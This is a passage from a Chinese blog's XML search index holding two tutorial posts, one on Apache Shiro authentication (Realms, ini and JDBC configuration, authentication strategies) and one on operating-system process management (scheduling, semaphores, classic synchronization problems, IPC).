      <tags>
        <tag>集群</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[身份验证]]></title>
    <url>%2F2018%2F11%2F03%2F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[身份验证身份验证，即在应用中谁能证明他就是他本人。一般提供如他们的身份 ID 一些标识信息来表明他就是他本人，如提供身份证，用户名 / 密码来证明。 在 shiro 中，用户需要提供 principals （身份）和 credentials（证明）给 shiro，从而应用能验证用户身份： principals：身份，即主体的标识属性，可以是任何东西，如用户名、邮箱等，唯一即可。一个主体可以有多个 principals，但只有一个 Primary principals，一般是用户名 / 密码 / 手机号。 credentials：证明 / 凭证，即只有主体知道的安全值，如密码 / 数字证书等。 最常见的 principals 和 credentials 组合就是用户名 / 密码了。接下来先进行一个基本的身份认证。 另外两个相关的概念是之前提到的 Subject 及 Realm，分别是主体及验证主体的数据源。 环境准备本文使用 Maven 构建，因此需要一点 Maven 知识。首先准备环境依赖： 1234567891011121314151617&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.9&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;version&gt;1.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;1.2.2&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 添加 junit、common-logging 及 shiro-core 依赖即可。 登录 / 退出1、首先准备一些用户身份 / 凭据（shiro.ini） 123[users]zhang=123wang=123 此处使用 ini 配置文件，通过 [users] 指定了两个主体：zhang/123、wang/123。 2、测试用例（com.github.zhangkaitao.shiro.chapter2.LoginLogoutTest） 12345678910111213141516171819@Testpublic void testHelloworld() &#123; //1、获取SecurityManager工厂，此处使用Ini配置文件初始化SecurityManager Factory&lt;org.apache.shiro.mgt.SecurityManager&gt; factory = new IniSecurityManagerFactory(&quot;classpath:shiro.ini&quot;); //2、得到SecurityManager实例 并绑定给SecurityUtils org.apache.shiro.mgt.SecurityManager securityManager = factory.getInstance(); SecurityUtils.setSecurityManager(securityManager); //3、得到Subject及创建用户名/密码身份验证Token（即用户身份/凭证） Subject subject = SecurityUtils.getSubject(); UsernamePasswordToken token = new UsernamePasswordToken(&quot;zhang&quot;, &quot;123&quot;); try &#123; //4、登录，即身份验证 subject.login(token); &#125; catch (AuthenticationException e) &#123; //5、身份验证失败 &#125; Assert.assertEquals(true, subject.isAuthenticated()); //断言用户已经登录 //6、退出 subject.logout();&#125; 首先通过 new IniSecurityManagerFactory 并指定一个 ini 配置文件来创建一个 SecurityManager 工厂； 接着获取 SecurityManager 并绑定到 SecurityUtils，这是一个全局设置，设置一次即可； 通过 SecurityUtils 得到 Subject，其会自动绑定到当前线程；如果在 web 环境在请求结束时需要解除绑定；然后获取身份验证的 Token，如用户名 / 密码； 调用 subject.login 方法进行登录，其会自动委托给 SecurityManager.login 方法进行登录； 如果身份验证失败请捕获 AuthenticationException 或其子类，常见的如： DisabledAccountException（禁用的帐号）、LockedAccountException（锁定的帐号）、UnknownAccountException（错误的帐号）、ExcessiveAttemptsException（登录失败次数过多）、IncorrectCredentialsException （错误的凭证）、ExpiredCredentialsException（过期的凭证）等，具体请查看其继承关系；对于页面的错误消息展示，最好使用如 “用户名 / 密码错误” 而不是 “用户名错误”/“密码错误”，防止一些恶意用户非法扫描帐号库； 最后可以调用 subject.logout 退出，其会自动委托给 SecurityManager.logout 方法退出。 从如上代码可总结出身份验证的步骤： 收集用户身份 / 凭证，即如用户名 / 密码； 调用 Subject.login 进行登录，如果失败将得到相应的 AuthenticationException 异常，根据异常提示用户错误信息；否则登录成功； 最后调用 Subject.logout 进行退出操作。 如上测试的几个问题： 用户名 / 密码硬编码在 ini 配置文件，以后需要改成如数据库存储，且密码需要加密存储； 用户身份 Token 可能不仅仅是用户名 / 密码，也可能还有其他的，如登录时允许用户名 / 邮箱 / 手机号同时登录。 身份认证流程 流程如下： 首先调用 Subject.login(token) 进行登录，其会自动委托给 Security Manager，调用之前必须通过 SecurityUtils.setSecurityManager() 设置； SecurityManager 负责真正的身份验证逻辑；它会委托给 Authenticator 进行身份验证； Authenticator 才是真正的身份验证者，Shiro API 中核心的身份认证入口点，此处可以自定义插入自己的实现； Authenticator 可能会委托给相应的 AuthenticationStrategy 进行多 Realm 身份验证，默认 ModularRealmAuthenticator 会调用 AuthenticationStrategy 进行多 Realm 身份验证； Authenticator 会把相应的 token 传入 Realm，从 Realm 获取身份验证信息，如果没有返回 / 抛出异常表示身份验证失败了。此处可以配置多个 Realm，将按照相应的顺序及策略进行访问。 RealmRealm：域，Shiro 从从 Realm 获取安全数据（如用户、角色、权限），就是说 SecurityManager 要验证用户身份，那么它需要从 Realm 获取相应的用户进行比较以确定用户身份是否合法；也需要从 Realm 得到用户相应的角色 / 权限进行验证用户是否能进行操作；可以把 Realm 看成 DataSource，即安全数据源。如我们之前的 ini 配置方式将使用 org.apache.shiro.realm.text.IniRealm。 org.apache.shiro.realm.Realm 接口如下： 1234String getName(); //返回一个唯一的Realm名字boolean supports(AuthenticationToken token); //判断此Realm是否支持此TokenAuthenticationInfo getAuthenticationInfo(AuthenticationToken token) throws AuthenticationException; //根据Token获取认证信息 单 Realm 配置 1、自定义 Realm 实现（com.github.zhangkaitao.shiro.chapter2.realm.MyRealm1）： 123456789101112131415161718192021222324public class MyRealm1 implements Realm &#123; @Override public String getName() &#123; return &quot;myrealm1&quot;; &#125; @Override public boolean supports(AuthenticationToken token) &#123; //仅支持UsernamePasswordToken类型的Token return token instanceof UsernamePasswordToken; &#125; @Override public AuthenticationInfo getAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; String username = (String)token.getPrincipal(); //得到用户名 String password = new String((char[])token.getCredentials()); //得到密码 if(!&quot;zhang&quot;.equals(username)) &#123; throw new UnknownAccountException(); //如果用户名错误 &#125; if(!&quot;123&quot;.equals(password)) &#123; throw new IncorrectCredentialsException(); //如果密码错误 &#125; //如果身份认证验证成功，返回一个AuthenticationInfo实现； return new SimpleAuthenticationInfo(username, password, getName()); &#125;&#125;&amp;nbsp; 2、ini 配置文件指定自定义 Realm 实现 (shiro-realm.ini) 1234\#声明一个realmmyRealm1=com.github.zhangkaitao.shiro.chapter2.realm.MyRealm1\#指定securityManager的realms实现securityManager.realms=$myRealm1&amp;nbsp; 通过 $name 来引入之前的 realm 定义 3、测试用例请参考 com.github.zhangkaitao.shiro.chapter2.LoginLogoutTest 的 testCustomRealm 测试方法，只需要把之前的 shiro.ini 配置文件改成 shiro-realm.ini 即可。 多 Realm 配置 1、ini 配置文件（shiro-multi-realm.ini） 12345\#声明一个realmmyRealm1=com.github.zhangkaitao.shiro.chapter2.realm.MyRealm1myRealm2=com.github.zhangkaitao.shiro.chapter2.realm.MyRealm2\#指定securityManager的realms实现securityManager.realms=$myRealm1,$myRealm2&amp;nbsp; securityManager 会按照 realms 指定的顺序进行身份认证。此处我们使用显示指定顺序的方式指定了 Realm 的顺序，如果删除 “securityManager.realms=myRealm1,myRealm2”，那么securityManager 会按照 realm 声明的顺序进行使用（即无需设置 realms 属性，其会自动发现），当我们显示指定 realm 后，其他没有指定 realm 将被忽略，如 “securityManager.realms=$myRealm1”，那么 myRealm2 不会被自动设置进去。 2、测试用例请参考 com.github.zhangkaitao.shiro.chapter2.LoginLogoutTest 的 testCustomMultiRealm 测试方法。 Shiro 默认提供的 Realm 以后一般继承 AuthorizingRealm（授权）即可；其继承了 AuthenticatingRealm（即身份验证），而且也间接继承了 CachingRealm（带有缓存实现）。其中主要默认实现如下： org.apache.shiro.realm.text.IniRealm：[users] 部分指定用户名 / 密码及其角色；[roles] 部分指定角色即权限信息； org.apache.shiro.realm.text.PropertiesRealm： user.username=password,role1,role2 指定用户名 / 密码及其角色；role.role1=permission1,permission2 指定角色及权限信息； org.apache.shiro.realm.jdbc.JdbcRealm：通过 sql 查询相应的信息，如 “select password from users where username = ?” 获取用户密码，“select password, password_salt from users where username = ?” 获取用户密码及盐；“select role_name from user_roles where username = ?” 获取用户角色；“select permission from roles_permissions where role_name = ?” 获取角色对应的权限信息；也可以调用相应的 api 进行自定义 sql； JDBC Realm 使用 1、数据库及依赖 12345678910&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.25&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;0.2.23&lt;/version&gt;&lt;/dependency&gt;&amp;nbsp; 本文将使用 mysql 数据库及 druid 连接池； 2、到数据库 shiro 下建三张表：users（用户名 / 密码）、user_roles（用户 / 角色）、roles_permissions（角色 / 权限），具体请参照 shiro-example-chapter2/sql/shiro.sql；并添加一个用户记录，用户名 / 密码为 zhang/123； 3、ini 配置（shiro-jdbc-realm.ini） 12345678jdbcRealm=org.apache.shiro.realm.jdbc.JdbcRealmdataSource=com.alibaba.druid.pool.DruidDataSourcedataSource.driverClassName=com.mysql.jdbc.DriverdataSource.url=jdbc:mysql://localhost:3306/shirodataSource.username=root\#dataSource.password=jdbcRealm.dataSource=$dataSourcesecurityManager.realms=$jdbcRealm&amp;nbsp; 变量名 = 全限定类名会自动创建一个类实例 变量名. 属性 = 值 自动调用相应的 setter 方法进行赋值 $ 变量名 引用之前的一个对象实例 测试代码请参照 com.github.zhangkaitao.shiro.chapter2.LoginLogoutTest 的 testJDBCRealm 方法，和之前的没什么区别。 Authenticator 及 AuthenticationStrategyAuthenticator 的职责是验证用户帐号，是 Shiro API 中身份验证核心的入口点： 12public AuthenticationInfo authenticate(AuthenticationToken authenticationToken) throws AuthenticationException;&amp;nbsp; 如果验证成功，将返回 AuthenticationInfo 验证信息；此信息中包含了身份及凭证；如果验证失败将抛出相应的 AuthenticationException 实现。 SecurityManager 接口继承了 Authenticator，另外还有一个 ModularRealmAuthenticator 实现，其委托给多个 Realm 进行验证，验证规则通过 AuthenticationStrategy 接口指定，默认提供的实现： FirstSuccessfulStrategy：只要有一个 Realm 验证成功即可，只返回第一个 Realm 身份验证成功的认证信息，其他的忽略； AtLeastOneSuccessfulStrategy：只要有一个 Realm 验证成功即可，和 FirstSuccessfulStrategy 不同，返回所有 Realm 身份验证成功的认证信息； AllSuccessfulStrategy：所有 Realm 验证成功才算成功，且返回所有 Realm 身份验证成功的认证信息，如果有一个失败就失败了。 ModularRealmAuthenticator 默认使用 AtLeastOneSuccessfulStrategy 策略。 假设我们有三个 realm：myRealm1： 用户名 / 密码为 zhang/123 时成功，且返回身份 / 凭据为 zhang/123；myRealm2： 用户名 / 密码为 wang/123 时成功，且返回身份 / 凭据为 wang/123；myRealm3： 用户名 / 密码为 zhang/123 时成功，且返回身份 / 凭据为 zhang@163.com/123，和 myRealm1 不同的是返回时的身份变了； 1、ini 配置文件 (shiro-authenticator-all-success.ini) 12345678910\#指定securityManager的authenticator实现authenticator=org.apache.shiro.authc.pam.ModularRealmAuthenticatorsecurityManager.authenticator=$authenticator\#指定securityManager.authenticator的authenticationStrategyallSuccessfulStrategy=org.apache.shiro.authc.pam.AllSuccessfulStrategysecurityManager.authenticator.authenticationStrategy=$allSuccessfulStrategymyRealm1=com.github.zhangkaitao.shiro.chapter2.realm.MyRealm1myRealm2=com.github.zhangkaitao.shiro.chapter2.realm.MyRealm2myRealm3=com.github.zhangkaitao.shiro.chapter2.realm.MyRealm3securityManager.realms=$myRealm1,$myRealm3 2、测试代码（com.github.zhangkaitao.shiro.chapter2.AuthenticatorTest） 首先通用化登录逻辑 123456789101112private void login(String configFile) &#123; //1、获取SecurityManager工厂，此处使用Ini配置文件初始化SecurityManager Factory&lt;org.apache.shiro.mgt.SecurityManager&gt; factory = new IniSecurityManagerFactory(configFile); //2、得到SecurityManager实例 并绑定给SecurityUtils org.apache.shiro.mgt.SecurityManager securityManager = factory.getInstance(); SecurityUtils.setSecurityManager(securityManager); //3、得到Subject及创建用户名/密码身份验证Token（即用户身份/凭证） Subject subject = SecurityUtils.getSubject(); UsernamePasswordToken token = new UsernamePasswordToken(&quot;zhang&quot;, &quot;123&quot;); subject.login(token);&#125; 测试 AllSuccessfulStrategy 成功： 12345678@Testpublic void testAllSuccessfulStrategyWithSuccess() &#123; login(&quot;classpath:shiro-authenticator-all-success.ini&quot;); Subject subject = SecurityUtils.getSubject(); //得到一个身份集合，其包含了Realm验证成功的身份信息 PrincipalCollection principalCollection = subject.getPrincipals(); Assert.assertEquals(2, principalCollection.asList().size());&#125;&amp;nbsp; 即 PrincipalCollection 包含了 zhang 和 zhang@163.com 身份信息。 测试 AllSuccessfulStrategy 失败： 12345 @Test(expected = UnknownAccountException.class) public void testAllSuccessfulStrategyWithFail() &#123; login(&quot;classpath:shiro-authenticator-all-fail.ini&quot;); Subject subject = SecurityUtils.getSubject();&#125;&amp;nbsp; shiro-authenticator-all-fail.ini 与 shiro-authenticator-all-success.ini 不同的配置是使用了 securityManager.realms=myRealm1，myRealm2；即 myRealm 验证失败。 对于 AtLeastOneSuccessfulStrategy 和 FirstSuccessfulStrategy 的区别，请参照 testAtLeastOneSuccessfulStrategyWithSuccess 和 testFirstOneSuccessfulStrategyWithSuccess 测试方法。唯一不同点一个是返回所有验证成功的 Realm 的认证信息；另一个是只返回第一个验证成功的 Realm 的认证信息。 自定义 AuthenticationStrategy 实现，首先看其 API： 1234567891011121314151617//在所有Realm验证之前调用AuthenticationInfo beforeAllAttempts(Collection&lt;? extends Realm&gt; realms, AuthenticationToken token) throws AuthenticationException;//在每个Realm之前调用AuthenticationInfo beforeAttempt(Realm realm, AuthenticationToken token, AuthenticationInfo aggregate) throws AuthenticationException;//在每个Realm之后调用AuthenticationInfo afterAttempt(Realm realm, AuthenticationToken token, AuthenticationInfo singleRealmInfo, AuthenticationInfo aggregateInfo, Throwable t)throws AuthenticationException;//在所有Realm之后调用AuthenticationInfo afterAllAttempts(AuthenticationToken token, AuthenticationInfo aggregate) throws AuthenticationException;&amp;nbsp; 因为每个 AuthenticationStrategy 实例都是无状态的，所有每次都通过接口将相应的认证信息传入下一次流程；通过如上接口可以进行如合并 / 返回第一个验证成功的认证信息。 自定义实现时一般继承 org.apache.shiro.authc.pam.AbstractAuthenticationStrategy 即可，具体可以参考代码 com.github.zhangkaitao.shiro.chapter2.authenticator.strategy 包下 OnlyOneAuthenticatorStrategy 和 AtLeastTwoAuthenticatorStrategy。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进程管理]]></title>
    <url>%2F2018%2F11%2F01%2F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[进程与线程1. 进程进程是资源分配的基本单位。 进程控制块 (Process Control Block, PCB) 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作。 下图显示了 4 个程序创建了 4 个进程，这 4 个进程可以并发地执行。 2. 线程线程是独立调度的基本单位。 一个进程中可以有多个线程，它们共享进程资源。 QQ 和浏览器是两个进程，浏览器进程里面有很多线程，例如 HTTP 请求线程、事件响应线程、渲染线程等等，线程的并发执行使得在浏览器中点击一个新链接从而发起 HTTP 请求时，浏览器还可以响应用户的其它事件。 3. 区别Ⅰ 拥有资源 进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问隶属进程的资源。 Ⅱ 调度 线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程中的线程切换到另一个进程中的线程时，会引起进程切换。 Ⅲ 系统开销 由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销。类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置，而线程切换时只需保存和设置少量寄存器内容，开销很小。 Ⅳ 通信方面 线程间可以通过直接读写同一进程中的数据进行通信，但是进程通信需要借助 IPC。 进程状态的切换 就绪状态（ready）：等待被调度 运行状态（running） 阻塞状态（waiting）：等待资源 应该注意以下内容： 只有就绪态和运行态可以相互转换，其它的都是单向转换。就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度。 阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态。 进程调度算法不同环境的调度算法目标不同，因此需要针对不同环境来讨论调度算法。 1. 批处理系统批处理系统没有太多的用户操作，在该系统中，调度算法目标是保证吞吐量和周转时间（从提交到终止的时间）。 1.1 先来先服务 first-come first-serverd（FCFS） 按照请求的顺序进行调度。 有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。 1.2 短作业优先 shortest job first（SJF） 按估计运行时间最短的顺序进行调度。 长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度。 1.3 最短剩余时间优先 shortest remaining time next（SRTN） 按估计剩余时间最短的顺序进行调度。 2. 交互式系统交互式系统有大量的用户交互操作，在该系统中调度算法的目标是快速地进行响应。 2.1 时间片轮转 将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程。 时间片轮转算法的效率和时间片的大小有很大关系： 因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。 而如果时间片过长，那么实时性就不能得到保证。 2.2 优先级调度 为每个进程分配一个优先级，按优先级进行调度。 为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级。 2.3 多级反馈队列 一个进程需要执行 100 个时间片，如果采用时间片轮转调度算法，那么需要交换 100 次。 多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。这种方式下，之前的进程只需要交换 7 次。 每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。 可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合。 3. 实时系统实时系统要求一个请求在一个确定时间内得到响应。 分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。 进程同步1. 临界区对临界资源进行访问的那段代码称为临界区。 为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检查。 123// entry section// critical section;// exit section 2. 同步与互斥 同步：多个进程按一定顺序执行； 互斥：多个进程在同一时刻只有一个进程能进入临界区。 3. 信号量信号量（Semaphore）是一个整型变量，可以对其执行 down 和 up 操作，也就是常见的 P 和 V 操作。 down : 如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0； up ：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。 down 和 up 操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。 如果信号量的取值只能为 0 或者 1，那么就成为了 互斥量（Mutex） ，0 表示临界区已经加锁，1 表示临界区解锁。 12345678910111213typedef int semaphore;semaphore mutex = 1;void P1() &#123; down(&amp;mutex); // 临界区 up(&amp;mutex);&#125;void P2() &#123; down(&amp;mutex); // 临界区 up(&amp;mutex);&#125; 使用信号量实现生产者-消费者问题 问题描述：使用一个缓冲区来保存物品，只有缓冲区没有满，生产者才可以放入物品；只有缓冲区不为空，消费者才可以拿走物品。 因为缓冲区属于临界资源，因此需要使用一个互斥量 mutex 来控制对缓冲区的互斥访问。 为了同步生产者和消费者的行为，需要记录缓冲区中物品的数量。数量可以使用信号量来进行统计，这里需要使用两个信号量：empty 记录空缓冲区的数量，full 记录满缓冲区的数量。其中，empty 信号量是在生产者进程中使用，当 empty 不为 0 时，生产者才可以放入物品；full 信号量是在消费者进程中使用，当 full 信号量不为 0 时，消费者才可以取走物品。 注意，不能先对缓冲区进行加锁，再测试信号量。也就是说，不能先执行 down(mutex) 再执行 down(empty)。如果这么做了，那么可能会出现这种情况：生产者对缓冲区加锁后，执行 down(empty) 操作，发现 empty = 0，此时生产者睡眠。消费者不能进入临界区，因为生产者对缓冲区加锁了，消费者就无法执行 up(empty) 操作，empty 永远都为 0，导致生产者永远等待下，不会释放锁，消费者因此也会永远等待下去。 123456789101112131415161718192021222324252627#define N 100typedef int semaphore;semaphore mutex = 1;semaphore empty = N;semaphore full = 0;void producer() &#123; while(TRUE) &#123; int item = produce_item(); down(&amp;empty); down(&amp;mutex); insert_item(item); up(&amp;mutex); up(&amp;full); &#125;&#125;void consumer() &#123; while(TRUE) &#123; down(&amp;full); down(&amp;mutex); int item = remove_item(); consume_item(item); up(&amp;mutex); up(&amp;empty); &#125;&#125; 4. 管程使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。 c 语言不支持管程，下面的示例代码使用了类 Pascal 语言来描述管程。示例代码的管程提供了 insert() 和 remove() 方法，客户端代码通过调用这两个方法来解决生产者-消费者问题。 1234567891011121314monitor ProducerConsumer integer i; condition c; procedure insert(); begin // ... end; procedure remove(); begin // ... end;end monitor; 管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否则其它进程永远不能使用管程。 管程引入了 条件变量 以及相关的操作：wait() 和 signal() 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。 使用管程实现生产者-消费者问题 123456789101112131415161718192021222324252627282930313233343536373839404142// 管程monitor ProducerConsumer condition full, empty; integer count := 0; condition c; procedure insert(item: integer); begin if count = N then wait(full); insert_item(item); count := count + 1; if count = 1 then signal(empty); end; function remove: integer; begin if count = 0 then wait(empty); remove = remove_item; count := count - 1; if count = N -1 then signal(full); end;end monitor;// 生产者客户端procedure producerbegin while true do begin item = produce_item; ProducerConsumer.insert(item); endend;// 消费者客户端procedure consumerbegin while true do begin item = ProducerConsumer.remove; consume_item(item); endend; 经典同步问题生产者和消费者问题前面已经讨论过了。 1. 读者-写者问题允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。 一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。 1234567891011121314151617181920212223242526typedef int semaphore;semaphore count_mutex = 1;semaphore data_mutex = 1;int count = 0;void reader() &#123; while(TRUE) &#123; down(&amp;count_mutex); count++; if(count == 1) down(&amp;data_mutex); // 第一个读者需要对数据进行加锁，防止写进程访问 up(&amp;count_mutex); read(); down(&amp;count_mutex); count--; if(count == 0) up(&amp;data_mutex); up(&amp;count_mutex); &#125;&#125;void writer() &#123; while(TRUE) &#123; down(&amp;data_mutex); write(); up(&amp;data_mutex); &#125;&#125; 以下内容由 @Bandi Yugandhar 提供。 The first case may result Writer to starve. This case favous Writers i.e no writer, once added to the queue, shall be kept waiting longer than absolutely necessary(only when there are readers that entered the queue before the writer). 12345678910111213141516171819202122232425262728293031323334353637383940414243444546int readcount, writecount; //(initial value = 0)semaphore rmutex, wmutex, readLock, resource; //(initial value = 1)//READERvoid reader() &#123;&lt;ENTRY Section&gt; down(&amp;readLock); // reader is trying to enter down(&amp;rmutex); // lock to increase readcount readcount++; if (readcount == 1) down(&amp;resource); //if you are the first reader then lock the resource up(&amp;rmutex); //release for other readers up(&amp;readLock); //Done with trying to access the resource&lt;CRITICAL Section&gt;//reading is performed&lt;EXIT Section&gt; down(&amp;rmutex); //reserve exit section - avoids race condition with readers readcount--; //indicate you&apos;re leaving if (readcount == 0) //checks if you are last reader leaving up(&amp;resource); //if last, you must release the locked resource up(&amp;rmutex); //release exit section for other readers&#125;//WRITERvoid writer() &#123; &lt;ENTRY Section&gt; down(&amp;wmutex); //reserve entry section for writers - avoids race conditions writecount++; //report yourself as a writer entering if (writecount == 1) //checks if you&apos;re first writer down(&amp;readLock); //if you&apos;re first, then you must lock the readers out. Prevent them from trying to enter CS up(&amp;wmutex); //release entry section&lt;CRITICAL Section&gt; down(&amp;resource); //reserve the resource for yourself - prevents other writers from simultaneously editing the shared resource //writing is performed up(&amp;resource); //release file&lt;EXIT Section&gt; down(&amp;wmutex); //reserve exit section writecount--; //indicate you&apos;re leaving if (writecount == 0) //checks if you&apos;re the last writer up(&amp;readLock); //if you&apos;re last writer, you must unlock the readers. Allows them to try enter CS for reading up(&amp;wmutex); //release exit section&#125; We can observe that every reader is forced to acquire ReadLock. On the otherhand, writers doesn’t need to lock individually. Once the first writer locks the ReadLock, it will be released only when there is no writer left in the queue. From the both cases we observed that either reader or writer has to starve. Below solutionadds the constraint that no thread shall be allowed to starve; that is, the operation of obtaining a lock on the shared data will always terminate in a bounded amount of time. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int readCount; // init to 0; number of readers currently accessing resource// all semaphores initialised to 1Semaphore resourceAccess; // controls access (read/write) to the resourceSemaphore readCountAccess; // for syncing changes to shared variable readCountSemaphore serviceQueue; // FAIRNESS: preserves ordering of requests (signaling must be FIFO)void writer()&#123; down(&amp;serviceQueue); // wait in line to be servicexs // &lt;ENTER&gt; down(&amp;resourceAccess); // request exclusive access to resource // &lt;/ENTER&gt; up(&amp;serviceQueue); // let next in line be serviced // &lt;WRITE&gt; writeResource(); // writing is performed // &lt;/WRITE&gt; // &lt;EXIT&gt; up(&amp;resourceAccess); // release resource access for next reader/writer // &lt;/EXIT&gt;&#125;void reader()&#123; down(&amp;serviceQueue); // wait in line to be serviced down(&amp;readCountAccess); // request exclusive access to readCount // &lt;ENTER&gt; if (readCount == 0) // if there are no readers already reading: down(&amp;resourceAccess); // request resource access for readers (writers blocked) readCount++; // update count of active readers // &lt;/ENTER&gt; up(&amp;serviceQueue); // let next in line be serviced up(&amp;readCountAccess); // release access to readCount // &lt;READ&gt; readResource(); // reading is performed // &lt;/READ&gt; down(&amp;readCountAccess); // request exclusive access to readCount // &lt;EXIT&gt; readCount--; // update count of active readers if (readCount == 0) // if there are no readers left: up(&amp;resourceAccess); // release resource access for all // &lt;/EXIT&gt; up(&amp;readCountAccess); // release access to readCount&#125; 2. 哲学家进餐问题 五个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。 下面是一种错误的解法，考虑到如果所有哲学家同时拿起左手边的筷子，那么就无法拿起右手边的筷子，造成死锁。 123456789101112#define N 5void philosopher(int i) &#123; while(TRUE) &#123; think(); take(i); // 拿起左边的筷子 take((i+1)%N); // 拿起右边的筷子 eat(); put(i); put((i+1)%N); &#125;&#125; 为了防止死锁的发生，可以设置两个条件： 必须同时拿起左右两根筷子； 只有在两个邻居都没有进餐的情况下才允许进餐。 123456789101112131415161718192021222324252627282930313233343536373839404142#define N 5#define LEFT (i + N - 1) % N // 左邻居#define RIGHT (i + 1) % N // 右邻居#define THINKING 0#define HUNGRY 1#define EATING 2typedef int semaphore;int state[N]; // 跟踪每个哲学家的状态semaphore mutex = 1; // 临界区的互斥semaphore s[N]; // 每个哲学家一个信号量void philosopher(int i) &#123; while(TRUE) &#123; think(); take_two(i); eat(); put_two(i); &#125;&#125;void take_two(int i) &#123; down(&amp;mutex); state[i] = HUNGRY; test(i); up(&amp;mutex); down(&amp;s[i]);&#125;void put_two(i) &#123; down(&amp;mutex); state[i] = THINKING; test(LEFT); test(RIGHT); up(&amp;mutex);&#125;void test(i) &#123; // 尝试拿起两把筷子 if(state[i] == HUNGRY &amp;&amp; state[LEFT] != EATING &amp;&amp; state[RIGHT] !=EATING) &#123; state[i] = EATING; up(&amp;s[i]); &#125;&#125; 进程通信进程同步与进程通信很容易混淆，它们的区别在于： 进程同步：控制多个进程按一定顺序执行； 进程通信：进程间传输信息。 进程通信是一种手段，而进程同步是一种目的。也可以说，为了能够达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。 1. 管道管道是通过调用 pipe 函数创建的，fd[0] 用于读，fd[1] 用于写。 12#include &lt;unistd.h&gt;int pipe(int fd[2]); 它具有以下限制： 只支持半双工通信（单向交替传输）； 只能在父子进程中使用。 2. FIFO也称为命名管道，去除了管道只能在父子进程中使用的限制。 123#include &lt;sys/stat.h&gt;int mkfifo(const char *path, mode_t mode);int mkfifoat(int fd, const char *path, mode_t mode); FIFO 常用于客户-服务器应用程序中，FIFO 用作汇聚点，在客户进程和服务器进程之间传递数据。 3. 消息队列相比于 FIFO，消息队列具有以下优点： 消息队列可以独立于读写进程存在，从而避免了 FIFO 中同步管道的打开和关闭时可能产生的困难； 避免了 FIFO 的同步阻塞问题，不需要进程自己提供同步方法； 读进程可以根据消息类型有选择地接收消息，而不像 FIFO 那样只能默认地接收。 4. 信号量它是一个计数器，用于为多个进程提供对共享数据对象的访问。 5. 共享存储允许多个进程共享一个给定的存储区。因为数据不需要在进程之间复制，所以这是最快的一种 IPC。 需要使用信号量用来同步对共享存储的访问。 多个进程可以将同一个文件映射到它们的地址空间从而实现共享内存。另外 XSI 共享内存不是使用文件，而是使用内存的匿名段。 